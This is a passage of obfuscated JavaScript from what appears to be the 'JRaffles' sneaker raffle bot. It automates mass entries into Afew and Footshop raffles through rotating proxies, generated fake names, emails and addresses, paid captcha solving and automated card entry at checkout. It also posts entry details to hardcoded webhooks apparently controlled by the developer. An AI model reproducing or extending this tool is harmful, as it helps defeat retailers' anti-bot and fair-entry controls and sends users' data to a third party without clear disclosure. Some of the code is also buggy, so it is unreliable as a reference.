                                    }, {
                                        'name': 'Delay',
                                        'value': '' + _0x5690b2['delay'],
                                        'inline': !![]
                                    })['setTimestamp']()['setFooter']({
                                        'text': 'JRaffles\x20v' + _0x2f0e91,
                                        'iconURL': 'https://pbs.twimg.com/profile_images/1592888006293192704/--rXvwpf_400x400.jpg'
                                    });
                                    return _0x432547['data'];
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}
async function _0x3e6cb2(_0x386c5f, _0x1e33e4) {
    var _0x138916 = _0x386c5f[_0x1e33e4]['Address1']['split'](''), _0x4ec6c6 = _0x386c5f[_0x1e33e4]['Address2']['split'](''), _0x351af8 = _0x386c5f[_0x1e33e4]['Email']['split']('@');
    for (var _0xc2cb99 = 0x0; _0xc2cb99 < _0x138916['length']; _0xc2cb99++) {
        if (_0x138916[_0xc2cb99] == 'X') {
            var _0x32968b = Math['round'](Math['random']() * (_0x5aad92['length'] - 0x1));
            _0x138916[_0xc2cb99] = _0x551705[_0x32968b];
        }
    }
    ;
    for (var _0xc2cb99 = 0x0; _0xc2cb99 < _0x4ec6c6['length']; _0xc2cb99++) {
        if (_0x4ec6c6[_0xc2cb99] == 'X') {
            var _0x32968b = Math['round'](Math['random']() * (_0x5aad92['length'] - 0x1));
            _0x4ec6c6[_0xc2cb99] = _0x551705[_0x32968b];
        }
    }
    ;
    _0x386c5f[_0x1e33e4]['FirstName'] == 'RANDOM' && (_0x386c5f[_0x1e33e4]['FirstName'] = _0x26d829['first']());
    _0x386c5f[_0x1e33e4]['LastName'] == 'RANDOM' && (_0x386c5f[_0x1e33e4]['LastName'] = _0x26d829['last']());
    _0x351af8[0x0] == 'RANDOM' ? _0x351af8[0x0] = '' + _0x26d829['first']() + _0x26d829['last']() + '@' : _0x351af8[0x0] = _0x351af8[0x0] + '@';
    _0x386c5f[_0x1e33e4]['Email'] = _0x351af8['join'](''), _0x386c5f[_0x1e33e4]['Address1'] = _0x138916['join'](''), _0x386c5f[_0x1e33e4]['Address2'] = _0x4ec6c6['join']('');
    _0x386c5f[_0x1e33e4]['Phone'] == 'RANDOM' && (_0x386c5f[_0x1e33e4]['Phone'] = '0' + _0x45f419(0x5f5e100, 0x3b9ac9ff));
    if (_0x386c5f[_0x1e33e4]['Follower'] == 'RANDOM') {
        var _0x50e882 = _0x45f419(0x1, 0x270f);
        _0x386c5f[_0x1e33e4]['Follower'] = '' + _0x26d829['first']() + _0x26d829['last']() + _0x50e882 + '\x20';
    }
    _0x386c5f[_0x1e33e4]['HouseNumber'] == 'RANDOM' && (_0x386c5f[_0x1e33e4]['HouseNumber'] = _0x45f419(0x1, 0xc8));
    if (_0x386c5f[_0x1e33e4]['Address1'] == 'RANDOM') {
        var _0x482596 = Math['round'](Math['random']() * (_0x5aad92['length'] - 0x1)), _0x5bfbbb = _0x551705[_0x482596];
        _0x386c5f[_0x1e33e4]['Address1'] = _0x26d829['last']() + 'straat', _0x386c5f[_0x1e33e4]['Zip'] == '' && (_0x386c5f[_0x1e33e4]['Postcode'] = _0x45f419(0x3e8, 0x270f) + '\x20' + _0x5bfbbb + _0x5bfbbb, _0x386c5f[_0x1e33e4]['Zip'] = _0x386c5f[_0x1e33e4]['Postcode']), _0x386c5f[_0x1e33e4]['HouseNumber'] = '' + _0x45f419(0x1, 0xc8);
    }
    return;
}
;
function _0x35d507() {
    let _0x33e53c = proxyFile['split']('\x0a'), _0x3b58ad = _0x33e53c['map']((_0x482fcc, _0x1079ec) => {
        sanatizeProxy = _0x482fcc['replace']('\x0d', '');
        if (_0x33e53c[_0x1079ec + 0x1] != undefined)
            return '' + sanatizeProxy;
        return '' + sanatizeProxy;
    });
    return _0x3b58ad;
}
;
async function _0x1c2fb2(_0x4862a) {
    var _0x516f77 = _0x4862a[0x1]['split'](':');
    const _0x205501 = await _0x4baac5['launch']({
        'headless': !![],
        'args': ['--proxy-server=' + _0x516f77[0x0] + ':' + _0x516f77[0x1] + ',--no-sandbox\x27,\x0a\x20\x20\x20\x20\x20\x20\x27--disable-setuid-sandbox,--force-device-scale-factor=0.3']
    });
    try {
        const _0x143b1c = await _0x205501['newPage']();
        await _0x143b1c['authenticate']({
            'username': '' + _0x516f77[0x2],
            'password': '' + _0x516f77[0x3]
        }), console['log'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Afew\x20Scraper\x20started'), await _0x143b1c['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x143b1c['setRequestInterception'](!![]), _0x143b1c['on']('request', _0x4d1920 => {
            _0x4d1920['resourceType']() === 'image' || _0x4d1920['resourceType']() === 'font' || _0x4d1920['resourceType']() === 'media' ? _0x4d1920['abort']() : _0x4d1920['continue']();
        }), await _0x143b1c['goto']('https://en.afew-store.com/collections/sneaker-raffles'), console['log'](_0x18cf54() + '\x20[' + _0x49a3de[taskModule]['name'] + ']\x20Looking\x20for\x20Raffles'), await _0x143b1c['waitForTimeout'](0xbb8), await _0x143b1c['waitForSelector']('.product-card');
        const _0x28e7a8 = await _0x143b1c['$$eval']('a.product-card', _0x1da694 => {
            return _0x1da694['map'](_0x290f9d => _0x290f9d['href']);
        });
        return _0x1752eb = _0x28e7a8;
    } catch (_0x5d7051) {
        console['log']('\x20' + _0x5d7051);
    } finally {
        _0x205501['close'](), console['clear']();
    }
}
;
async function _0x4ba913(_0x3cbf01, _0x30d0d7, _0x324da6, _0x16b007, _0x31df1a) {
    _0x30d0d7 != 'ver' && await _0x3e6cb2(_0x16b007, _0x3cbf01);
    if (_0x5690b2['useRandomProxy'] = ![])
        var _0x3f3c5d = _0x31df1a[_0x3cbf01]['split'](':');
    else
        var _0x1b3653 = Math['round'](Math['random']() * (_0x31df1a['length'] - 0x1)), _0x3f3c5d = _0x31df1a[_0x1b3653]['split'](':');
    var _0x115bb0 = _0x324da6['data'];
    _0x30d0d7 != 'ver' && (_0x115bb0['data']['attributes']['properties']['$first_name'] = '' + _0x16b007[_0x3cbf01]['FirstName'], _0x115bb0['data']['attributes']['properties']['$last_name'] = '' + _0x16b007[_0x3cbf01]['LastName'], _0x115bb0['data']['attributes']['properties']['$address1'] = _0x16b007[_0x3cbf01]['Address1'] + '\x20' + _0x16b007[_0x3cbf01]['HouseNumber'] + '\x20' + _0x16b007[_0x3cbf01]['Address2'], _0x115bb0['data']['attributes']['properties']['$zip'] = '' + _0x16b007[_0x3cbf01]['Zip'], _0x115bb0['data']['attributes']['properties']['$city'] = '' + _0x16b007[_0x3cbf01]['City'], _0x115bb0['data']['attributes']['properties']['$country'] = '' + _0x16b007[_0x3cbf01]['Country'], _0x115bb0['data']['attributes']['properties']['Size'] = '' + _0x16b007[_0x3cbf01]['Size'], _0x115bb0['data']['attributes']['properties']['Instagram\x20Handle'] = '' + _0x16b007[_0x3cbf01]['Follower'], _0x30d0d7 == 'exp' ? _0x115bb0['data']['attributes']['email'] = '' + _0x16b007[_0x3cbf01]['FirstName'] + _0x16b007[_0x3cbf01]['LastName'] + _0x5690b2['catchall'] : _0x115bb0['data']['attributes']['email'] = '' + _0x16b007[_0x3cbf01]['Email']);
    var _0x25dbe3 = {
        'jar': _0x5d48fa,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x324da6['url'],
        'headers': _0x324da6['headers'],
        'body': JSON['stringify'](_0x115bb0),
        'proxy': 'http://' + _0x3f3c5d[0x2] + ':' + _0x3f3c5d[0x3] + '@' + _0x3f3c5d[0x0] + ':' + _0x3f3c5d[0x1]
    };
    return _0x30d0d7 === 'ver' && (_0x25dbe3['method'] = 'GET'), new Promise(function (_0x37bd45, _0x2cf5da) {
        callback = async (_0x23bbd3, _0x230c78, _0x54d3c2) => {
            if (!_0x23bbd3 && _0x230c78['statusCode'] == 0xca || !_0x23bbd3 && _0x230c78['statusCode'] == 0xc8) {
                _0x37bd45(console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x324da6['name'] + ']\x20Task\x20' + (_0x3cbf01 + 0x1) + ':\x20Raffle\x20Entered!')));
                if (_0x30d0d7 != 'ver') {
                    var _0x27ab50 = await _0x3553d9(_0x16b007[_0x3cbf01], _0x324da6, 'dev', ![]), _0x94ad0 = await _0x3553d9(_0x16b007[_0x3cbf01], _0x324da6, 'pub', ![]);
                    const _0x378115 = {
                        'succesDEVMSG': { 'embeds': [_0x27ab50] },
                        'succesPUBMSG': { 'embeds': [_0x94ad0] }
                    };
                    if (_0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '')
                        try {
                            await _0x278fc0(_0x5690b2['webhook'], _0x378115['succesDEVMSG']);
                        } catch {
                        }
                    await _0x73378f(0xc8), await _0x278fc0(_0x4c279b, _0x378115['succesDEVMSG']), await _0x73378f(0xc8);
                    try {
                        await _0x278fc0(_0x319480, _0x378115['succesPUBMSG']);
                    } catch {
                    }
                } else {
                    if (_0x30d0d7 == 'ver') {
                        var _0x27ab50 = await _0x3553d9(null, _0x324da6, 'ver', ![]);
                        const _0x551f06 = {
                            'succesDEVMSG': { 'embeds': [_0x27ab50] },
                            'succesPUBMSG': { 'embeds': [_0x94ad0] }
                        };
                        await _0x278fc0(_0x1ea743, _0x551f06['succesDEVMSG']);
                    }
                }
            } else {
                if (_0x30d0d7 != 'ver') {
                    var _0x760a63 = '' + _0x23bbd3, _0x13684a = await _0x3553d9(_0x16b007[_0x3cbf01], _0x324da6, 'dev', !![], _0x760a63), _0x2629a9 = {};
                    _0x2629a9['errorDEV'] = { 'embeds': [_0x13684a] }, _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x2629a9['errorDEV']), await _0x278fc0(_0x51b669, _0x2629a9['errorDEV']);
                }
                _0x2cf5da(console['log'](_0x18cf54() + '\x20[' + _0x324da6['name'] + ']\x20Task\x20' + (_0x3cbf01 + 0x1) + ':\x20' + _0x23bbd3));
            }
        };
        try {
            _0x30d0d7 === 'ver' ? console['log'](_0x18cf54() + '\x20[' + _0x324da6['name'] + ']\x20Task\x20' + (_0x3cbf01 + 0x1) + ':\x20Verifying.') : console['log'](_0x18cf54() + '\x20[' + _0x324da6['name'] + ']\x20Task\x20' + (_0x3cbf01 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x115bb0['data']['attributes']['email']), _0x262614(_0x25dbe3, callback);
        } catch (_0x3d3e8f) {
            console['log'](_0x18cf54() + '\x20Task\x20' + (_0x3cbf01 + 0x1) + ':\x20' + _0x3d3e8f);
        }
    });
}
;
async function _0x5309d5(_0x3905b9, _0xeac9f8, _0x501a96) {
    _0x4baac5['use'](_0x3f14b2()), _0x4baac5['use'](_0x318e48({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5690b2['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x399354 = 0x0; _0x399354 < _0x3905b9['length']; _0x399354++) {
        var _0x50df95, _0x558a61 = '', _0x4c329b = 0x0, _0x4c3d47 = [{
            'type': 'rich',
            'title': 'Succesful\x20Footshop\x20entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x5746a9
                },
                {
                    'name': 'Product',
                    'value': '' + _0x3905b9[_0x399354]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x3905b9[_0x399354]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5690b2['footshopDelay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x2f0e91
                }
            ]
        }], _0x54e0d3 = await _0x3553d9(_0x3905b9[_0x399354], _0x501a96, 'dev', ![]), _0x3f0689 = await _0x3553d9(_0x3905b9[_0x399354], _0x501a96, 'pub', ![]);
        const _0x2a0198 = {
            'succesDEVMSG': { 'embeds': [_0x54e0d3] },
            'succesPUBMSG': { 'embeds': [_0x3f0689] }
        }, _0x15d987 = { 'embeds': _0x4c3d47 };
        await _0x3e6cb2(_0x3905b9, _0x399354);
        if (_0x3905b9[_0x399354]['Email'] == '' || _0x3905b9[_0x399354]['FirstName'] == '' || _0x3905b9[_0x399354]['LastName'] == '' || _0x3905b9[_0x399354]['Country'] == '' || _0x3905b9[_0x399354]['Size'] == '' || _0x3905b9[_0x399354]['Address1'] == '' || _0x3905b9[_0x399354]['Zip'] == '') {
            console['log'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x3905b9[_0x399354]['Email'] == '' || _0x3905b9[_0x399354]['FirstName'] == '' || _0x3905b9[_0x399354]['LastName'] == '' || _0x3905b9[_0x399354]['Country'] == '' || _0x3905b9[_0x399354]['Size'] == '' || _0x3905b9[_0x399354]['Address1'] == '' || _0x3905b9[_0x399354]['Zip'] == '' || _0x3905b9[_0x399354]['Phone'] == '') {
            console['log'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        const _0x410fce = '' + _0x3905b9[_0x399354]['Url'];
        if (_0x5690b2['useRandomProxy'] = ![])
            var _0x25ba9e = _0xeac9f8[_0x399354]['split'](':');
        else
            var _0x399f80 = Math['round'](Math['random']() * (_0xeac9f8['length'] - 0x1)), _0x25ba9e = _0xeac9f8[_0x399f80]['split'](':');
        const _0x58296c = await _0x4baac5['launch']({
            'headless': !![],
            'args': ['--proxy-server=' + _0x25ba9e[0x0] + ':' + _0x25ba9e[0x1]]
        });
        try {
            const _0x37928c = await _0x58296c['newPage']();
            await _0x37928c['authenticate']({
                'username': '' + _0x25ba9e[0x2],
                'password': '' + _0x25ba9e[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x37928c['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x37928c['setRequestInterception'](!![]), _0x37928c['on']('request', _0x10fe21 => {
                _0x10fe21['resourceType']() === 'image' || _0x10fe21['resourceType']() === 'font' || _0x10fe21['resourceType']() === 'media' ? _0x10fe21['abort']() : _0x10fe21['continue']();
            }), await _0x37928c['goto'](_0x410fce), await _0x73378f(0xbb8), await _0x37928c['waitForSelector']('.control__JhutY'), await _0x37928c['click']('.control__JhutY'), await _0x73378f(0x1f4);
            if (_0x3905b9[_0x399354]['Size'] != 'RANDOM')
                try {
                    const _0x671c9a = await _0x37928c['$x']('//div[contains(text(),\x20\x27' + _0x3905b9[_0x399354]['Size'] + '\x27)]');
                    await _0x671c9a[0x0]['click']();
                } catch {
                    console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x20Size\x20Not\x20Found'));
                    continue;
                }
            else {
                const _0x4cbffe = await _0x37928c['$$']('.options__3UQpT\x20>\x20div.row');
                var _0x4a76ad = Math['round'](Math['random']() * (_0x4cbffe['length'] - 0x1));
                await _0x4cbffe[_0x4a76ad]['click']();
            }
            await _0x73378f(0x4b0);
            const _0x112ef8 = await _0x37928c['$x']('//span[contains(text(),\x20\x27Enter\x20raffle\x20now\x27)]');
            await _0x112ef8[0x0]['click'](), await _0x37928c['waitForSelector']('input[name=\x22email\x22]'), console['log'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x20Filling\x20Entry\x20Credentials'), await _0x37928c['type']('input[name=\x22email\x22]', '' + _0x3905b9[_0x399354]['Email']), await _0x73378f(0x640), await _0x37928c['type']('input[name=\x22phone\x22]', '' + _0x3905b9[_0x399354]['Phone']), await _0x73378f(0x4b0), await _0x37928c['click']('button.btn.continue-button__1RtsS'), await _0x73378f(0x4b0);
            try {
                await _0x37928c['type']('input[name=\x22firstName\x22]', '' + _0x3905b9[_0x399354]['FirstName']), await _0x73378f(0x258);
            } catch {
                const _0x53e537 = await _0x37928c['$$eval']('.invalid-feedback\x20>\x20div', _0x4e66b7 => {
                    return _0x4e66b7['map'](_0x4153cb => _0x4153cb['innerText']);
                });
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x20' + _0x53e537));
                continue;
            }
            await _0x37928c['type']('input[name=\x22lastName\x22]', '' + _0x3905b9[_0x399354]['LastName']), await _0x73378f(0xc8), await _0x37928c['type']('input[name=\x22instagramUsername\x22]', '' + _0x3905b9[_0x399354]['Follower']), await _0x73378f(0x4b0), await _0x37928c['click']('button.btn.continue-button__1RtsS'), await _0x73378f(0x3e8), console['log'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x20Filling\x20Shipping'), await _0x37928c['select']('select[name=\x22country\x22]', '' + _0x3905b9[_0x399354]['Country']), await _0x73378f(0x2bc), await _0x37928c['type']('input[name=\x22streetName\x22]', '' + _0x3905b9[_0x399354]['Address1']), await _0x73378f(0x258), await _0x37928c['type']('input[name=\x22houseNumber\x22]', _0x3905b9[_0x399354]['HouseNumber'] + '\x20' + _0x3905b9[_0x399354]['Address2']), await _0x73378f(0xc8), await _0x37928c['type']('input[name=\x22postalCode\x22]', '' + _0x3905b9[_0x399354]['Zip']), await _0x73378f(0x1f4), await _0x37928c['type']('input[name=\x22city\x22]', '' + _0x3905b9[_0x399354]['City']), await _0x73378f(0x4b0), await _0x37928c['click']('input[name=\x22consent::privacy-policy-101\x22]'), await _0x73378f(0x4b0), await _0x37928c['click']('button.btn.continue-button__1RtsS'), await _0x73378f(0x4b0), console['log'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x20Solving\x20hCaptcha'), await _0x37928c['solveRecaptchas'](), console['log'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x20hCaptcha\x20solved'), await _0x73378f(0xbb8), await _0x37928c['click']('button.btn.continue-button__1RtsS'), await _0x73378f(0x1388), console['log'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x37928c['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x37928c['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x73378f(0x4b0), await _0x37928c['type']('span[data-cse=\x22encryptedCardNumber\x22]', '' + _0x3905b9[_0x399354]['CardNumber']), await _0x73378f(0x320), await _0x37928c['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x37928c['type']('span[data-cse=\x22encryptedExpiryDate\x22]', '' + _0x3905b9[_0x399354]['ExpiryDate']), await _0x73378f(0x4b0), await _0x37928c['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x37928c['type']('span[data-cse=\x22encryptedSecurityCode\x22]', '' + _0x3905b9[_0x399354]['CVV']), await _0x73378f(0x226), await _0x37928c['type']('input[name=\x22holderName\x22]', '' + _0x3905b9[_0x399354]['NameOnCard']), await _0x73378f(0x226), await _0x37928c['click']('button.adyen-checkout__button'), console['log'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x37928c['waitForSelector']('.thank-you__1AwOo', { 'timeout': 0x493e0 }), await _0x73378f(0xbb8);
            } catch (_0x40df4f) {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x203DS\x20Failed')), _0x50df95 = '3DS\x20Error\x20' + _0x40df4f;
                var _0x17c92b = await _0x3553d9(_0x3905b9[_0x399354], _0x501a96, 'dev', !![], _0x50df95);
                _0x2a0198['errorDEV'] = { 'embeds': [_0x17c92b] };
                _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x2a0198['errorDEV']);
                await _0x278fc0(_0x51b669, _0x2a0198['errorDEV']);
                continue;
            }
            console['log'](_0x5ecce5['green'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
            if (_0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '')
                try {
                    await _0x278fc0(_0x5690b2['webhook'], _0x2a0198['succesDEVMSG']);
                } catch {
                }
            await _0x73378f(0xc8), await _0x278fc0(_0x4c279b, _0x2a0198['succesDEVMSG']), await _0x73378f(0xc8);
            try {
                await _0x278fc0(_0x319480, _0x2a0198['succesPUBMSG']);
            } catch {
            }
        } catch (_0x13a483) {
            console['log'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x20' + _0x13a483), _0x50df95 = '' + _0x13a483;
            var _0x17c92b = await _0x3553d9(_0x3905b9[_0x399354], _0x501a96, 'dev', !![], _0x50df95);
            _0x2a0198['errorDEV'] = { 'embeds': [_0x17c92b] }, _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x2a0198['errorDEV']), await _0x278fc0(_0x51b669, _0x2a0198['errorDEV']), _0x558a61 = 'yes';
        } finally {
            _0x58296c['close']();
            if (_0x558a61 == 'yes' && _0x4c329b != 0x5) {
                console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x501a96['name'] + ']\x20Task\x20' + (_0x399354 + 0x1) + '\x20:\x20Retrying')), _0x399354 = _0x399354 - 0x1, _0x4c329b = _0x4c329b + 0x1;
                continue;
            }
            console['log']('Waiting\x20for\x20' + _0x5690b2['footshopDelay'] + '\x20ms'), await _0x73378f(_0x5690b2['footshopDelay']);
        }
    }
}
afewFunction = async (_0x4576ce, _0x4f9f5d, _0x5a2f7f, _0x2db2ad, _0x4c6ee7) => {
    for (var _0x313d04 = 0x0; _0x313d04 < _0x2db2ad['length']; _0x313d04++) {
        _0x5690b2['AfewDelay'] = _0x5690b2['delay'];
        var _0x378cbe, _0xb49b77 = '', _0x24e263 = 0x0;
        _0x2db2ad[_0x313d04]['Url'] = _0x4576ce, _0x992352(_0x5a2f7f['name'] + '\x20Task\x20' + (_0x313d04 + 0x1) + '\x20/\x20' + _0x2db2ad['length'] + '\x20||\x20File:\x20' + _0x3dc3e8 + '\x20Proxies:\x20' + _0x261ffa), await _0x3e6cb2(_0x2db2ad, _0x313d04);
        var _0x3c2fa2 = await _0x3553d9(_0x2db2ad[_0x313d04], _0x5a2f7f, 'dev', ![]), _0x4e6e37 = await _0x3553d9(_0x2db2ad[_0x313d04], _0x5a2f7f, 'pub', ![]);
        const _0x19c51a = {
            'succesDEVMSG': { 'embeds': [_0x3c2fa2] },
            'succesPUBMSG': { 'embeds': [_0x4e6e37] }
        };
        if (_0x2db2ad[_0x313d04]['Email'] == '' || _0x2db2ad[_0x313d04]['FirstName'] == '' || _0x2db2ad[_0x313d04]['LastName'] == '' || _0x2db2ad[_0x313d04]['Country'] == '' || _0x2db2ad[_0x313d04]['Size'] == '' || _0x2db2ad[_0x313d04]['Address1'] == '' || _0x2db2ad[_0x313d04]['Zip'] == '') {
            console['log'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        if (_0x5690b2['useRandomProxy'] = ![])
            var _0x125936 = _0x4c6ee7[_0x313d04]['split'](':');
        else
            var _0xa12bf2 = Math['round'](Math['random']() * (_0x4c6ee7['length'] - 0x1)), _0x125936 = _0x4c6ee7[_0xa12bf2]['split'](':');
        const _0x43911d = await _0x4baac5['launch']({
            'headless': !![],
            'args': [
                '--proxy-server=' + _0x125936[0x0] + ':' + _0x125936[0x1],
                '--no-sandbox',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x58eaef = await _0x43911d['newPage']();
            await _0x58eaef['setDefaultNavigationTimeout'](0x1d4c0), await _0x58eaef['authenticate']({
                'username': '' + _0x125936[0x2],
                'password': '' + _0x125936[0x3]
            }), console['log'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x58eaef['setUserAgent']('Mozilla/5.0\x20(Windows\x20NT\x2010.0;\x20Win64;\x20x64)\x20AppleWebKit/537.36\x20(KHTML,\x20like\x20Gecko)\x20Chrome/106.0.0.0\x20Safari/537.36'), await _0x58eaef['setRequestInterception'](!![]), _0x58eaef['on']('request', _0x1098a0 => {
                _0x1098a0['resourceType']() === 'image' || _0x1098a0['resourceType']() === 'font' || _0x1098a0['resourceType']() === 'media' ? _0x1098a0['abort']() : _0x1098a0['continue']();
            }), await _0x58eaef['goto'](_0x4576ce, { 'waitUntil': 'networkidle2' }), console['log'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20Gathering\x20cookies'), await _0x58eaef['waitForTimeout'](0xfa0), console['log'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20Cookies\x20received'), await _0x58eaef['waitForTimeout'](0x320);
            if (_0x2db2ad[_0x313d04]['Size'] == 'RANDOM') {
                console['log'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20Choosing\x20random\x20size');
                const _0x461703 = await _0x58eaef['$$eval']('div.size-picker.mt-2\x20>\x20ul\x20>\x20li\x20>\x20a', _0x18f8a7 => {
                    return _0x18f8a7['map'](_0x483bd0 => _0x483bd0['href']);
                });
                var _0x55ae2d = Math['round'](Math['random']() * (_0x461703['length'] - 0x1));
                await _0x58eaef['goto']('' + _0x461703[_0x55ae2d]);
            } else {
                console['log'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20Choosing\x20Size\x20' + _0x2db2ad[_0x313d04]['Size']);
                try {
                    const _0x1e5d36 = await _0x58eaef['$$eval']('li[data-original-title=\x22Größe\x20in\x20EU:\x20' + _0x2db2ad[_0x313d04]['Size'] + '\x22]\x20>\x20a', _0x5eb28e => {
                        return _0x5eb28e['map'](_0x1ed65b => _0x1ed65b['href']);
                    });
                    await _0x58eaef['goto']('' + _0x1e5d36[0x0], { 'waitUntil': 'networkidle2' });
                } catch (_0x2d2f6a) {
                    console['log'](_0x5ecce5['red'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20' + _0x2d2f6a + '\x20Size\x20not\x20found')), _0x378cbe = 'Size\x20Not\x20Found';
                    var _0x4406fd = await _0x3553d9(_0x2db2ad[_0x313d04], _0x5a2f7f, 'dev', !![], _0x378cbe);
                    _0x19c51a['errorDEV'] = { 'embeds': [_0x4406fd] };
                    _0x5690b2['webhook'] != undefined && _0x5690b2['webhook'] != '' && await _0x278fc0(_0x5690b2['webhook'], _0x19c51a['errorDEV']);
                    await _0x278fc0(_0x51b669, _0x19c51a['errorDEV']);
                    continue;
                }
            }
            await _0x58eaef['waitForTimeout'](0x258), await _0x58eaef['type']('#raffle-instagram', '' + _0x2db2ad[_0x313d04]['Follower'], { 'delay': 0x64 }), await _0x58eaef['waitForTimeout'](0x384), await _0x58eaef['click']('#raffle-terms'), await _0x58eaef['waitForTimeout'](0x384), await _0x58eaef['evaluate'](() => {
                const _0x39dc87 = document['querySelector']('button.btn[name=\x27add\x27]');
                _0x39dc87['click']();
            }), await _0x58eaef['waitForTimeout'](0xbb8), await _0x58eaef['waitForSelector']('#checkout_email'), await _0x73378f(0x3e8), console['log'](_0x18cf54() + '\x20[' + _0x5a2f7f['name'] + ']\x20Task\x20' + (_0x313d04 + 0x1) + '\x20:\x20Filling\x20Information');
            _0x4f9f5d == 'sec' ? await _0x58eaef['type']('#checkout_email', '' + _0x2db2ad[_0x313d04]['FirstName'] + _0x2db2ad[_0x313d04]['LastName'] + _0x5690b2['catchall'], 0x32) : await _0x58eaef['type']('#checkout_email', '' + _0x2db2ad[_0x313d04]['Email'], 0x32);
            await _0x73378f(0x320), await _0x58eaef['select']('#checkout_shipping_address_country', '' + _0x2db2ad[_0x313d04]['Country']), await _0x58eaef['waitForTimeout'](0x258), await _0x58eaef['type']('#checkout_shipping_address_first_name', '' + _0x2db2ad[_0x313d04]['FirstName']), await _0x58eaef['waitForTimeout'](0x320), await _0x58eaef['type']('#checkout_shipping_address_last_name', '' + _0x2db2ad[_0x313d04]['LastName']), await _0x58eaef['waitForTimeout'](0x2bc), await _0x58eaef['type']('#checkout_shipping_address_address1', _0x2db2ad[_0x313d04]['Address1'] + '\x20' + _0x2db2ad[_0x313d04]['HouseNumber']), await _0x58eaef['waitForTimeout'](0x2bc), await _0x58eaef['type']('#checkout_shipping_address_address2', '' + _0x2db2ad[_0x313d04]['Address2']), await _0x58eaef['waitForTimeout'](0x2bc);
            _0x2db2ad[_0x313d04]['Postcode'] == undefined ? await _0x58eaef['type']('#checkout_shipping_address_zip', '' + _0x2db2ad[_0x313d04]['Zip']) : await _0x58eaef['type']('#checkout_shipping_address_zip', '' + _0x2db2ad[_0x313d04]['Postcode']);
